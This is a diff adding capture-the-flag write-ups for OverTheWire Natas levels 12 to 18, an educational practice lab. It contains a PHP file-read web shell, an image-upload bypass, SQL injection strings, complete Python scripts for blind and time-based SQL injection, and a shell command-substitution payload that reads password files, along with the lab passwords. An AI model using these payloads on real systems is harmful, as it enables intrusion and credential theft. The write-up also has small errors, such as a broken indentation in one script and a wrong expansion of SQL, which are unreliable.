@@ -239,8 +239,8 @@ content will be printed, but not before the password to natas10.
 I'm not entirely sure what is up with this challenge compared to the last one,
 I think there may have been another solution for natas9 involving input with 
 characters '&' and/or ';', as the php source code for natas10 involves an `if` 
-statement with `preg_match` for these character (which performs a regular 
-expression search).
+statement with `preg_match` for these characters (`preg_match` performs a
+regular expression search).
 
 Anyway, the solution for natas9 still works perfectly fine here, and can
 get the password for natas11.
@@ -378,10 +378,296 @@ password waiting for us.
 
 > Password for natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 
+### Natas12
+
+Now we learn about how to exploit the uploading of files, first with the most
+basic exploitation of all. We are prompted to upload an image file, and are
+free to take a look at the source code for how it will be processed and added
+to the server. Observing the source code however, we see that the file
+extension is taken from a variable called "filename", which we can find as a
+hidden input on the upload page. If we change the value of this filename to
+"file.php", and upload a php file (shown below) instead of an image file, then
+the page refreshes showing a link to our file, and when we click the link,
+we find our password.
+
+```
+<?php
+$password = file_get_contents('/etc/natas_webpass/natas13');
+echo $password;
+?>
+```
+
+> Password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+### Natas13
+
+Another file upload, but this time we are told that only image files will be
+accepted. If we take a look at the source code this time, we find that there
+is some new code containing the function `exif_imagetype`. After a look at the
+manual for this function 
+([here](https://www.php.net/manual/en/function.exif-imagetype.php)),
+we see that it only checks the first few bytes of an image to discover what
+type of image it is. So our solution, is to upload the same code we did before,
+but this time, sneakily appended to the end of an actual image file.
+
+Upon clicking the link after uploading, we'll see the output from the first
+bytes of our "image" file, followed by the password for natas14.
+
+> Password for natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+### Natas14
+
+We're finished with uploading files for the moment, and are onto something new:
+MySQL queries. SQL stands for Standard Query Language, and is used to
+communicate with a database. We're going to learn how to do a basic SQL
+injection.
+
+The various functions in the natas14 source code do the following:
+
+* `mysql_connect`: Search for a database at the server (arg 1) using the 
+username (arg 2) and password (arg 3). In this case: localhost, natas14
+and <censored>.
+* `mysql_select_db`: Selects current active database on the server associated
+with the the specified link identifier. In this case: the database is named
+natas14.
+* `mysql_query`: Sends a query (arg 1) to the active database on the server
+given (arg 2). Returns resources upon success, the number of rows that
+were returned can be found with `mysql_num_rows()`.
+* `mysql_num_rows`: Get number of rows that were returned by `mysql_query`.
+
+From the source code, we can see that `$query` is defined by the username and
+password that we supply. It will select all rows (\*) from users where
+username and password are those supplied. A normal with name "anythingatall"
+and password "ChelseaSuck" would look like this:
+
+```
+SELECT * from users where username="anythingatall" and password="ChelseaSuck";
+```
+
+This query will return all data from the 'users' database for any user
+matching the username and password. SQL injection is a very simple concept:
+we're going to insert text in our input that will alter interpretation of
+the query. As we can see, the fields are separated by double quotes, so we
+want to use double quotes to separate our fake password, and a new piece of
+SQL code: user = `anythingatall`, password = `ChelseaSuck" OR "1=1`. This will
+change the query to:
+
+```
+SELECT * from users where username="anythingatall" 
+and password="ChelseaSuck" OR "1=1";
+```
+
+`1=1` will always evaluate as true, so we will receive all rows from the
+database users. Upon entry of this password, we are rewarded with the natas15
+password.
+
+> Password for natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+### Natas15
+
+In this exercise, we need to find the 32-byte password for the username
+"natas16" from our SQL database. We can retrieve this data easily from our SQL
+query, just as in natas14, but unfortunately this time, we cannot simply read
+the information from our query. The only information we get from our query
+is whether it was successful (**TRUE** result) or unsuccessful
+(**FALSE** result).
+
+There is a particular type of SQL injection for these conditions:
+**blind-based SQL injection**. We test different conditions, and see whether
+we get a success or fail return from our query. In this example, we test the
+first character of natas16's password, with a query like this (the part in
+curly braces is our injection, and 'X' as our character):
+
+```
+SELECT * from users where username="{natas16" AND SUBSTRING(password,1,1)
+LIKE BINARY "X}"
+```
+
+If 'X' is the first letter of the password, the query will return successful,
+and we receive the 'This user exists' response (our **TRUE** return). If 'X' is
+not the first letter of the password however, the query will return an error,
+and we receive the 'Error in query' response (our **FALSE** return).
+
+To automate this process, as it would take hours to complete it manually, we
+can use the Requests library for python for our attempts, in natas15.py:
+
+```
+import re
+import requests as req
+from requests.auth import HTTPBasicAuth
+
+i = 1
+LOGIN = 'http://natas15.natas.labs.overthewire.org'
+chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+passwd = ''
+
+for i in range(1,33):
+    for char in chars:
+        payload = {'username':'natas16"' + 
+                'AND SUBSTRING(password,1,' + str(i) + ')' +
+                ' LIKE BINARY"' + passwd + char} 
+        r = req.post(LOGIN, auth=HTTPBasicAuth('natas15',
+            'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=payload)
+        if (re.search('This user exists',r.text)):
+            passwd += char
+            print (passwd)
+            i += 1
+			break
+```
+
+The code will access the natas15 page with our injection input (payload). The
+query will check the first 'i' characters of the password, until all 32
+characters have been deduced. After testing the query, the `if` statement
+will check to see if the query returned **TRUE**, and if so, our password
+will be extended by the new character and we'll move on to querying the next.
+
+If we run:
+
+```
+python natas15.py > natas15.out
+```
+
+Then we can see the output from our code, the first successful query for each
+character of the password, until the eventual solution is found.
+
+> Password for natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+### Natas16
+
+natas10 was no challenge at all, as our natas9 solution was still perfectly
+viable. natas16 on the other hand, returns to grep-exploitation, and this time
+the characters ``;|&\`\'"`` are all going to be checked for with `preg_match` -
+killing our previous solution.
+
+Luckily for us though, the characters `$` and `()` are still permitted, which
+allows us to execute a command in a subshell during the grep call (this is
+a feature of bash, see [here][GNULINK].
+
+So we are free to make one command, however we will be unable to see the output
+from it, so calls to `cat` are useless. Instead the output will be used within
+a grep command. We can manipulate this into a similar format as natas15:
+
+1. We use a grep command to read /etc/natas_webpass/natas17, and supply a
+string as a guess - specifying that the string is at the beginning of the
+password.
+	1. If the string is present, **our** grep will return the
+password, which will then be used to search "dictionary.txt" with a **second**
+grep - this second grep will return **NO RESULTS**, as our password is
+clearly not present in the dictionary file.
+	2. If the string is NOT present, **our** grep returns an empty string,
+and therefore the **second** grep will return **everything** in the dictionary.
+2. We check the output - if present, our guess as to the start of the string
+is incorrect. If not present, then our guess so far is correct.
+
+We will use the `grep` command with `^` preceding our string, this specifies
+that the string must be at the **START** of the searched text. This is what
+allows us to guess character by character from the beginning to the end of
+the string.
+
+In python:
+
+```
+import re
+import requests as req
+from requests.auth import HTTPBasicAuth
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+LOGIN = 'http://natas16.natas.labs.overthewire.org'
+password = ''
+
+def check_if_in_pass(string):
+    needle = '$(grep ^' + string + ' /etc/natas_webpass/natas17)'
+    payload = {'needle':needle} 
+    r = req.post(LOGIN, auth=HTTPBasicAuth('natas16',
+        'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=payload)
+    if not (re.search('African',r.content)):
+        return True
+    return False
+
+i = 0
+for i in range(0, 32):
+    for char in chars:
+        if (check_if_in_pass(password + char)):
+            password += char
+            print (password)
+            break
+    i += 1
+```
+
+Just as in natas15, this code will determine the password character by
+character, until the final string is the total password.
+
+> Password for natas17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+### Natas17
+
+natas17 is identical to natas15 with one key difference: all of the output from
+queries is now commented out, so we can't use the output for our testing any
+more. SQL has a function however that we can test for: we can add a line
+**SLEEP(5)** into our sql injection (text in between {} is our injection,
+X is the string to test):
+
+```
+SELECT * from users where username="{natas18" AND SUBSTRING(password,1,end)
+LIKE BINARY "X" AND SLEEP(5)#}"
+```
+
+We also need to end our query with a '#'. When a query is tested with
+conditions, it ends at the first FALSE condition. So in our query,
+username=natas18 will always evaluate as TRUE, and for most of our guesses,
+SUBSTRING(password,1,end) LIKE BINARY "X" will evaluate as FALSE - and each
+query will be relatively fast.
+
+For our correct guesses however, SUBSTRING(password,1,end) LIKE BINARY "X" will
+evaluate as TRUE, and thus SLEEP(5) will be executed. As such, whenever we
+correctly guess a new character, the query will take much longer, over 5
+seconds.
+
+Our code reflects our new test criteria, using the **time** module to check
+how long each query takes.
+
+```
+import time
+import re
+import requests as req
+from requests.auth import HTTPBasicAuth
+
+i = 1
+LOGIN = 'http://natas17.natas.labs.overthewire.org'
+chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+passwd = ''
+
+for i in range(1,33):
+    for char in chars:
+        payload = {'username':'natas18"' + 
+                'AND SUBSTRING(password,1,' + str(i) + ')' +
+                ' LIKE BINARY"' + passwd + char + '" AND SLEEP(5)#'} 
+        start_time = time.time()
+        r = req.post(LOGIN, auth=HTTPBasicAuth('natas17',
+            '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=payload)
+        if (time.time() - start_time > 5):
+            passwd += char
+            print (passwd)
+            i += 1
+            break
+```
+
+The code will take around 3 minutes to complete, but will print out the
+password as it is determined to show us it's functioning.
+
+> Password for natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
+
+### Natas18
+
+Text
+
+> Password for natas19: 
+
 ### Natas
 
 Text
 
-> Password for natas:
+> Password for natas: 
 
 [OTW]: https://overthewire.org
+[GNULINK]: http://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Substitution)
